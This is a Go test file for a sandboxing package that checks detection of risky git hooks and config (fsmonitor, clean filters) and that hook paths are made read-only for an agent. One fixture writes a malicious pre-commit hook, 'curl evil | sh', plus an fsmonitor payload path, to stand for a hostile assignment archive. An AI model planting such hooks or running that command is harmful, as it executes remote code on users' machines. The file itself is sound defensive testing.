package cage

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/dusty/zoo/internal/config"
)

func gitInit(t *testing.T) string {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	root := t.TempDir()
	if out, err := exec.Command("git", "-C", root, "init", "-q").CombinedOutput(); err != nil {
		t.Fatalf("git init: %v %s", err, out)
	}
	root, _ = filepath.EvalSymlinks(root)
	return root
}

func gitSet(t *testing.T, root, k, v string) {
	t.Helper()
	if out, err := exec.Command("git", "-C", root, "config", k, v).CombinedOutput(); err != nil {
		t.Fatalf("git config: %v %s", err, out)
	}
}

func TestHostGitRisksPreexisting(t *testing.T) {
	root := gitInit(t)
	// What a malicious "assignment" zip ships: a hook and an fsmonitor.
	write(t, filepath.Join(root, ".git/hooks/pre-commit"), "#!/bin/sh\ncurl evil | sh\n")
	write(t, filepath.Join(root, ".git/hooks/pre-push.sample"), "sample")
	gitSet(t, root, "core.fsmonitor", "/tmp/payload")
	gitSet(t, root, "credential.helper", "osxkeychain") // benign
	risks := HostGitRisks(root)
	var got []string
	for _, r := range risks {
		got = append(got, r.Path)
		if r.Writable != "" {
			t.Errorf("%s flagged writable: %s", r.Path, r.Writable)
		}
	}
	j := strings.Join(got, "|")
	if !strings.Contains(j, "pre-commit") || !strings.Contains(j, "core.fsmonitor") {
		t.Fatalf("missed risks: %s", j)
	}
	if strings.Contains(j, "sample") || strings.Contains(j, "credential") {
		t.Fatalf("flagged benign entries: %s", j)
	}
}

func TestHooksPathInWorktreeIsGuarded(t *testing.T) {
	root := gitInit(t)
	gitSet(t, root, "core.hooksPath", ".husky")
	write(t, filepath.Join(root, "scripts/clean.sh"), "#!/bin/sh\n")
	gitSet(t, root, "filter.x.clean", "sh scripts/clean.sh %f")
	got := WritableGitPaths(root)
	want := []string{filepath.Join(root, ".husky"), filepath.Join(root, "scripts/clean.sh")}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("writable = %v, want %v", got, want)
	}
	if st, err := os.Stat(filepath.Join(root, ".husky")); err != nil || !st.IsDir() {
		t.Fatal("missing hooks dir should be created so the agent can't create it")
	}
	write(t, filepath.Join(root, ".husky/pre-commit"), "npm test\n")
	var found bool
	for _, r := range HostGitRisks(root) {
		if strings.HasSuffix(r.Path, ".husky/pre-commit") && r.Writable != "" {
			found = true
		}
	}
	if !found {
		t.Fatal("hook in a worktree hooksPath not reported as writable")
	}
	pl, err := NewPlan(root, config.Defaults(), config.Project{}, "")
	if err != nil {
		t.Fatal(err)
	}
	ro := strings.Join(pl.ReadOnly, ",")
	for _, w := range want {
		if !strings.Contains(ro, w) {
			t.Errorf("%s not read-only in the plan: %s", w, ro)
		}
	}
}
